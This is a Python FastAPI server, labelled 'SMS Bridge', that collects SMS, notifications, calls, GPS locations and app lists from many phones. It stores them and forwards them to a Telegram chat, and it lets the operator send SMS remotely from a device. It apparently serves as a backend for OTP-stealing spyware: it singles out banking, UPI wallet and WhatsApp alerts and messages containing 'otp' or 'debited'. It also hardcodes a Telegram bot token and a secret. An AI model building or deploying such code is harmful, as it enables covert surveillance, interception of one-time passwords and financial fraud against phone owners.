from fastapi import FastAPI, HTTPException, Header, Depends, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse
from pydantic import BaseModel
from typing import Optional, List
import httpx, os, sqlite3, uuid
from contextlib import contextmanager
from datetime import datetime

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

BOT_TOKEN = "8316470557:AAHtVja8KtF3QFQ_nudfgA0ybFLrhycl8KQ"
CHAT_ID   = "6764413681"
SECRET    = "bridge_x9k2m7p4q1"
DB_PATH   = os.getenv("DB_PATH", "/data/sms.db")

def init_db():
    db_dir = os.path.dirname(DB_PATH) or "."
    os.makedirs(db_dir, exist_ok=True)
    with sqlite3.connect(DB_PATH) as c:
        c.executescript("""
            CREATE TABLE IF NOT EXISTS messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device TEXT NOT NULL, sender TEXT NOT NULL,
                body TEXT NOT NULL, received_at TEXT NOT NULL,
                forwarded INTEGER DEFAULT 0,
                created_at TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS notifications (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device TEXT NOT NULL, app_name TEXT, app_package TEXT,
                title TEXT, text TEXT,
                created_at TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS calls (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device TEXT NOT NULL, number TEXT, type TEXT, duration INTEGER DEFAULT 0,
                created_at TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS installed_apps (
                device TEXT NOT NULL, app_name TEXT NOT NULL,
                PRIMARY KEY (device, app_name)
            );
            CREATE TABLE IF NOT EXISTS commands (
                id TEXT PRIMARY KEY, device TEXT NOT NULL,
                type TEXT NOT NULL, payload TEXT NOT NULL,
                status TEXT DEFAULT 'pending',
                created_at TEXT DEFAULT (datetime('now')),
                acked_at TEXT
            );
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY, value TEXT NOT NULL
            );
            CREATE TABLE IF NOT EXISTS heartbeats (
                device TEXT PRIMARY KEY, last_seen TEXT NOT NULL,
                last_error INTEGER, battery INTEGER, charging INTEGER,
                wifi INTEGER, signal INTEGER, network_type TEXT
            );
            CREATE TABLE IF NOT EXISTS locations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device TEXT NOT NULL, lat REAL, lng REAL, accuracy REAL,
                recorded_at TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS events (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device TEXT NOT NULL, event TEXT NOT NULL,
                detail TEXT DEFAULT '',
                created_at TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS devices (
                id TEXT PRIMARY KEY, display_name TEXT NOT NULL,
                first_seen TEXT DEFAULT (datetime('now')),
                phone_number TEXT DEFAULT ''
            );
            CREATE TABLE IF NOT EXISTS retry_queue (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device TEXT NOT NULL, sender TEXT NOT NULL,
                body TEXT NOT NULL, received_at TEXT NOT NULL,
                attempts INTEGER DEFAULT 0,
                created_at TEXT DEFAULT (datetime('now'))
            );
            INSERT OR IGNORE INTO settings VALUES ('enabled','1');
        """)
        c.commit()

init_db()

@contextmanager
def db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    try:
        yield conn
    finally:
        conn.close()

def auth(x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)

def ensure_device(c, device: str):
    if not c.execute("SELECT id FROM devices WHERE id=?", (device,)).fetchone():
        c.execute("INSERT OR IGNORE INTO devices (id,display_name) VALUES (?,?)", (device, device))
        c.execute("INSERT INTO events (device,event,detail) VALUES (?,?,?)",
                  (device, "new_device", f"New device: {device}"))
        c.commit()

async def send_tg(text: str, chat_id: str = None) -> bool:
    cid = chat_id or CHAT_ID
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    async with httpx.AsyncClient(timeout=10) as c:
        try:
            r = await c.post(url, json={"chat_id": cid, "text": text, "parse_mode": "HTML"})
            return r.status_code == 200
        except: return False

# ── Models ────────────────────────────────────────────────────────────────────

class SMS(BaseModel):
    device: str; sender: str; body: str; received_at: Optional[str] = None

class Heartbeat(BaseModel):
    device: str; last_error: Optional[int] = None
    battery: Optional[int] = None; charging: Optional[bool] = None
    wifi: Optional[bool] = None; signal: Optional[int] = None
    network_type: Optional[str] = None

class LocationUpdate(BaseModel):
    device: str; lat: float; lng: float; accuracy: float

class NotificationPayload(BaseModel):
    device: str; app_name: str; app_package: str; title: str; text: str

class CallPayload(BaseModel):
    device: str; number: str; type: str; duration: int = 0

class AppsPayload(BaseModel):
    device: str; apps: List[str]

class Event(BaseModel):
    device: str; event: str; detail: str = ""

class CommandAck(BaseModel):
    command_id: str; status: str

class DeviceRename(BaseModel):
    device_id: str; new_name: str

class PhoneNumberUpdate(BaseModel):
    device_id: str; phone_number: str

# ── Dashboard ─────────────────────────────────────────────────────────────────

@app.get("/")
def root(): return FileResponse("static/index.html")

# ── SMS ───────────────────────────────────────────────────────────────────────

@app.post("/sms")
async def receive_sms(sms: SMS, x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)
    ts = sms.received_at or datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    with db() as c:
        ensure_device(c, sms.device)
        enabled = (c.execute("SELECT value FROM settings WHERE key='enabled'").fetchone() or {"value":"1"})["value"] == "1"
        dev_on  = (c.execute("SELECT value FROM settings WHERE key=?", (f"enabled_{sms.device.replace(' ','_')}",)).fetchone() or {"value":"1"})["value"] == "1"
        active  = enabled and dev_on
        c.execute("INSERT INTO messages (device,sender,body,received_at,forwarded) VALUES (?,?,?,?,?)",
                  (sms.device, sms.sender, sms.body, ts, int(active)))
        c.commit()
    fwd = False
    if active:
        with db() as c:
            d = c.execute("SELECT display_name,phone_number FROM devices WHERE id=?", (sms.device,)).fetchone()
            label = (d["display_name"] if d else sms.device) + (f" ({d['phone_number']})" if d and d["phone_number"] else "")
        fwd = await send_tg(f"📱 <b>{label}</b>\n👤 <code>{sms.sender}</code>\n🕐 {ts}\n──────────────\n{sms.body}")
        if not fwd:
            with db() as c:
                c.execute("INSERT INTO retry_queue (device,sender,body,received_at) VALUES (?,?,?,?)",
                          (sms.device, sms.sender, sms.body, ts))
                c.commit()
    return {"ok": True, "forwarded": fwd}

# ── Heartbeat ─────────────────────────────────────────────────────────────────

@app.post("/heartbeat")
def heartbeat(hb: Heartbeat, x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)
    now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    with db() as c:
        ensure_device(c, hb.device)
        c.execute("""INSERT OR REPLACE INTO heartbeats
            (device,last_seen,last_error,battery,charging,wifi,signal,network_type)
            VALUES (?,?,?,?,?,?,?,?)""",
            (hb.device, now, hb.last_error,
             hb.battery, int(hb.charging) if hb.charging is not None else None,
             int(hb.wifi) if hb.wifi is not None else None,
             hb.signal, hb.network_type))
        c.commit()
    return {"ok": True}

# ── Location ──────────────────────────────────────────────────────────────────

@app.post("/location")
def location(loc: LocationUpdate, x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)
    with db() as c:
        ensure_device(c, loc.device)
        c.execute("INSERT INTO locations (device,lat,lng,accuracy) VALUES (?,?,?,?)",
                  (loc.device, loc.lat, loc.lng, loc.accuracy))
        c.commit()
    return {"ok": True}

# ── Notifications ─────────────────────────────────────────────────────────────

@app.post("/notification")
async def notification(n: NotificationPayload, x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)
    with db() as c:
        ensure_device(c, n.device)
        c.execute("INSERT INTO notifications (device,app_name,app_package,title,text) VALUES (?,?,?,?,?)",
                  (n.device, n.app_name, n.app_package, n.title, n.text))
        c.commit()
        d = c.execute("SELECT display_name FROM devices WHERE id=?", (n.device,)).fetchone()
        label = d["display_name"] if d else n.device

    # Only forward notable apps — WhatsApp, banking, delivery, etc.
    FORWARD_APPS = {
        "com.whatsapp", "com.whatsapp.w4b",
        "com.google.android.apps.messaging",
        "com.instagram.android", "com.facebook.orca",
        "com.telegram.messenger",
        "in.amazon.mshop.android.shopping",
        "com.zomato.ordering", "com.swiggy.android",
        "com.phonepe.app", "net.one97.paytm",
        "com.google.android.apps.nbu.paisa.user",
        "com.mobikwik_new", "com.freecharge.android",
    }

    should_fwd = (
        n.app_package in FORWARD_APPS or
        any(k in n.text.lower() for k in ["otp", "payment", "credited", "debited", "₹", "rs.", "transaction"]) or
        any(k in n.title.lower() for k in ["otp", "payment", "bank", "alert"])
    )

    if should_fwd:
        await send_tg(
            f"🔔 <b>{n.app_name}</b> — <i>{label}</i>\n"
            f"<b>{n.title}</b>\n{n.text}"
        )
    return {"ok": True}

# ── Calls ─────────────────────────────────────────────────────────────────────

@app.post("/call")
async def call(c_: CallPayload, x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)
    with db() as c:
        ensure_device(c, c_.device)
        c.execute("INSERT INTO calls (device,number,type,duration) VALUES (?,?,?,?)",
                  (c_.device, c_.number, c_.type, c_.duration))
        c.commit()
        d = c.execute("SELECT display_name FROM devices WHERE id=?", (c_.device,)).fetchone()
        label = d["display_name"] if d else c_.device

    icon = {"missed": "📵", "incoming_ringing": "📲", "ended": "📞"}.get(c_.type, "📞")
    dur_str = f" ({c_.duration}s)" if c_.type == "ended" and c_.duration else ""
    await send_tg(f"{icon} <b>{c_.type.replace('_',' ').title()}</b>{dur_str}\n"
                  f"📱 {label}\n👤 <code>{c_.number}</code>")
    return {"ok": True}

# ── Installed Apps ────────────────────────────────────────────────────────────

@app.post("/apps")
def apps(payload: AppsPayload, x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)
    with db() as c:
        ensure_device(c, payload.device)
        c.execute("DELETE FROM installed_apps WHERE device=?", (payload.device,))
        for a in payload.apps:
            c.execute("INSERT OR IGNORE INTO installed_apps (device,app_name) VALUES (?,?)",
                      (payload.device, a))
        c.commit()
    return {"ok": True}

@app.get("/apps/{device}")
def get_apps(device: str, _=Depends(auth)):
    with db() as c:
        rows = c.execute("SELECT app_name FROM installed_apps WHERE device=? ORDER BY app_name",
                         (device,)).fetchall()
        return [r["app_name"] for r in rows]

# ── Remote commands ───────────────────────────────────────────────────────────

@app.get("/commands/pending")
def pending_commands(device: str, x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)
    with db() as c:
        rows = c.execute(
            "SELECT * FROM commands WHERE device=? AND status='pending' ORDER BY created_at LIMIT 5",
            (device,)).fetchall()
        return [dict(r) for r in rows]

@app.post("/commands/ack")
def ack_command(ack: CommandAck, x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)
    now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    with db() as c:
        c.execute("UPDATE commands SET status=?, acked_at=? WHERE id=?",
                  (ack.status, now, ack.command_id))
        c.commit()
    return {"ok": True}

# ── Telegram webhook (for remote SMS send command) ────────────────────────────

@app.post("/telegram-webhook")
async def tg_webhook(req: Request):
    try:
        data = await req.json()
        msg  = data.get("message", {})
        text = (msg.get("text") or "").strip()
        cid  = str(msg.get("chat", {}).get("id", ""))

        if not text: return {"ok": True}

        if text == "/start":
            await send_tg(
                "👋 <b>SMS Bridge active!</b>\n\n"
                "All SMS, notifications and calls from your phones appear here automatically.\n\n"
                "<b>Remote SMS send:</b>\n"
                "<code>/sms &lt;device&gt; &lt;number&gt; &lt;message&gt;</code>\n\n"
                "Example:\n"
                "<code>/sms Redmi+91XXXXXXXXXX Hello there</code>", cid
            )

        elif text.startswith("/sms "):
            # Format: /sms DeviceName +91XXXXXXXXXX message text here
            parts = text[5:].split(" ", 2)
            if len(parts) < 3:
                await send_tg("Usage: /sms &lt;device_name&gt; &lt;number&gt; &lt;message&gt;", cid)
            else:
                device_name, number, message = parts
                cmd_id = str(uuid.uuid4())[:8]
                import json
                with db() as c:
                    # Find device by display name (partial match)
                    rows = c.execute("SELECT id FROM devices WHERE display_name LIKE ?",
                                     (f"%{device_name}%",)).fetchall()
                    if not rows:
                        await send_tg(f"Device '{device_name}' not found. Check device names in dashboard.", cid)
                    else:
                        dev_id = rows[0]["id"]
                        c.execute(
                            "INSERT INTO commands (id,device,type,payload) VALUES (?,?,?,?)",
                            (cmd_id, dev_id, "send_sms",
                             json.dumps({"to": number, "text": message}))
                        )
                        c.commit()
                        await send_tg(
                            f"✓ SMS queued\n📱 Device: {dev_id}\n👤 To: {number}\n"
                            f"📝 Message: {message}\n🆔 Command: {cmd_id}", cid
                        )

        elif text.startswith("/list"):
            with db() as c:
                devs = c.execute("SELECT id,display_name FROM devices").fetchall()
            if not devs:
                await send_tg("No devices registered yet.", cid)
            else:
                lines = "\n".join([f"• {d['display_name']} ({d['id']})" for d in devs])
                await send_tg(f"<b>Registered Devices:</b>\n{lines}", cid)

    except Exception as e:
        pass
    return {"ok": True}

# ── Event ─────────────────────────────────────────────────────────────────────

@app.post("/event")
def event(ev: Event, x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)
    with db() as c:
        ensure_device(c, ev.device)
        c.execute("INSERT INTO events (device,event,detail) VALUES (?,?,?)",
                  (ev.device, ev.event, ev.detail))
        c.commit()
    return {"ok": True}

# ── Dashboard API ─────────────────────────────────────────────────────────────

@app.get("/dashboard")
def dashboard(_=Depends(auth)):
    with db() as c:
        total     = c.execute("SELECT COUNT(*) as n FROM messages").fetchone()["n"]
        forwarded = c.execute("SELECT COUNT(*) as n FROM messages WHERE forwarded=1").fetchone()["n"]
        retry_cnt = c.execute("SELECT COUNT(*) as n FROM retry_queue").fetchone()["n"]
        notif_cnt = c.execute("SELECT COUNT(*) as n FROM notifications").fetchone()["n"]
        call_cnt  = c.execute("SELECT COUNT(*) as n FROM calls").fetchone()["n"]
        hb_map    = {r["device"]: dict(r) for r in c.execute("SELECT * FROM heartbeats").fetchall()}
        settings  = {r["key"]: r["value"] for r in c.execute("SELECT * FROM settings").fetchall()}
        devs_db   = {r["id"]: dict(r) for r in c.execute("SELECT * FROM devices").fetchall()}
        msg_stats = {r["device"]: dict(r) for r in c.execute(
            "SELECT device,COUNT(*) as total,SUM(forwarded) as forwarded,MAX(received_at) as last_msg FROM messages GROUP BY device"
        ).fetchall()}
        messages  = c.execute("SELECT * FROM messages ORDER BY id DESC LIMIT 50").fetchall()
        notifs    = c.execute("SELECT * FROM notifications ORDER BY id DESC LIMIT 50").fetchall()
        calls     = c.execute("SELECT * FROM calls ORDER BY id DESC LIMIT 30").fetchall()
        events    = c.execute("SELECT * FROM events ORDER BY id DESC LIMIT 100").fetchall()
        locs      = {}
        for r in c.execute("SELECT DISTINCT device FROM locations").fetchall():
            loc = c.execute("SELECT * FROM locations WHERE device=? ORDER BY id DESC LIMIT 1",
                            (r["device"],)).fetchone()
            if loc: locs[r["device"]] = dict(loc)

        now = datetime.utcnow()
        all_ids = set(list(devs_db.keys()) + list(hb_map.keys()) + list(msg_stats.keys()))
        devices = []
        for dev_id in all_ids:
            hb   = hb_map.get(dev_id, {})
            info = devs_db.get(dev_id, {})
            stat = msg_stats.get(dev_id, {"total":0,"forwarded":0,"last_msg":None})
            ls   = hb.get("last_seen")
            if ls:
                diff = (now - datetime.strptime(ls, "%Y-%m-%d %H:%M:%S")).total_seconds()
                status = "active" if diff < 600 else "idle"
            else: status = "unknown"
            err = hb.get("last_error")
            ERR = {101:"SMS perm denied",102:"Location denied",103:"Not default SMS",201:"No internet",
                   202:"Timeout",203:"HTTP error",301:"Bad secret",401:"GPS off",402:"Loc timeout"}
            bat  = hb.get("battery")
            chg  = hb.get("charging")
            wifi = hb.get("wifi")
            sig  = hb.get("signal")
            ntype= hb.get("network_type")
            n_cnt= c.execute("SELECT COUNT(*) as n FROM notifications WHERE device=?", (dev_id,)).fetchone()["n"]
            c_cnt= c.execute("SELECT COUNT(*) as n FROM calls WHERE device=?", (dev_id,)).fetchone()["n"]
            a_cnt= c.execute("SELECT COUNT(*) as n FROM installed_apps WHERE device=?", (dev_id,)).fetchone()["n"]
            devices.append({
                "device_id": dev_id,
                "display_name": info.get("display_name", dev_id),
                "phone_number": info.get("phone_number",""),
                "first_seen": info.get("first_seen"),
                "total": stat["total"], "forwarded": stat["forwarded"] or 0,
                "last_msg": stat["last_msg"], "last_seen": ls, "status": status,
                "last_error": err, "error_desc": ERR.get(err,"") if err else "",
                "enabled": settings.get(f"enabled_{dev_id.replace(' ','_')}","1") == "1",
                "location": locs.get(dev_id),
                "battery": bat, "charging": bool(chg) if chg is not None else None,
                "wifi": bool(wifi) if wifi is not None else None,
                "signal": sig, "network_type": ntype,
                "notif_count": n_cnt, "call_count": c_cnt, "app_count": a_cnt,
            })

        return {
            "total": total, "forwarded": forwarded, "retry_pending": retry_cnt,
            "notif_total": notif_cnt, "call_total": call_cnt,
            "global_enabled": settings.get("enabled","1") == "1",
            "devices": devices,
            "messages": [dict(m) for m in messages],
            "notifications": [dict(n) for n in notifs],
            "calls": [dict(c) for c in calls],
            "events": [dict(e) for e in events],
        }

@app.get("/messages")
def messages(_=Depends(auth)):
    with db() as c:
        return [dict(r) for r in c.execute("SELECT * FROM messages ORDER BY id DESC LIMIT 100").fetchall()]

@app.post("/toggle/global")
def toggle_global(enabled: bool, _=Depends(auth)):
    with db() as c:
        c.execute("INSERT OR REPLACE INTO settings VALUES ('enabled',?)", ("1" if enabled else "0",))
        c.commit()
    return {"enabled": enabled}

@app.post("/toggle/device")
def toggle_device(device: str, enabled: bool, _=Depends(auth)):
    with db() as c:
        c.execute("INSERT OR REPLACE INTO settings VALUES (?,?)",
                  (f"enabled_{device.replace(' ','_')}", "1" if enabled else "0"))
        c.commit()
    return {"device": device, "enabled": enabled}

@app.post("/device/rename")
def rename(body: DeviceRename, _=Depends(auth)):
    with db() as c:
        c.execute("UPDATE devices SET display_name=? WHERE id=?", (body.new_name, body.device_id))
        c.execute("INSERT INTO events (device,event,detail) VALUES (?,?,?)",
                  (body.device_id, "renamed", f"Renamed to: {body.new_name}"))
        c.commit()
    return {"ok": True}

@app.post("/device/phone")
def set_phone(body: PhoneNumberUpdate, _=Depends(auth)):
    with db() as c:
        c.execute("UPDATE devices SET phone_number=? WHERE id=?", (body.phone_number, body.device_id))
        c.commit()
    return {"ok": True}

@app.delete("/messages")
def clear(_=Depends(auth)):
    with db() as c:
        c.execute("DELETE FROM messages")
        c.commit()
    return {"ok": True}

@app.post("/retry")
async def retry_queue(_=Depends(auth)):
    with db() as c:
        rows = c.execute("SELECT * FROM retry_queue WHERE attempts<5 ORDER BY id LIMIT 10").fetchall()
    for r in rows:
        ok = await send_tg(f"📱 <b>{r['device']}</b>\n👤 <code>{r['sender']}</code>\n🕐 {r['received_at']}\n──────────────\n{r['body']}")
        with db() as c:
            if ok: c.execute("DELETE FROM retry_queue WHERE id=?", (r['id'],))
            else:  c.execute("UPDATE retry_queue SET attempts=attempts+1 WHERE id=?", (r['id'],))
            c.commit()
    return {"ok": True}

@app.get("/events")
def events(_=Depends(auth)):
    with db() as c:
        return [dict(r) for r in c.execute("SELECT * FROM events ORDER BY id DESC LIMIT 200").fetchall()]

app.mount("/static", StaticFiles(directory="static"), name="static")
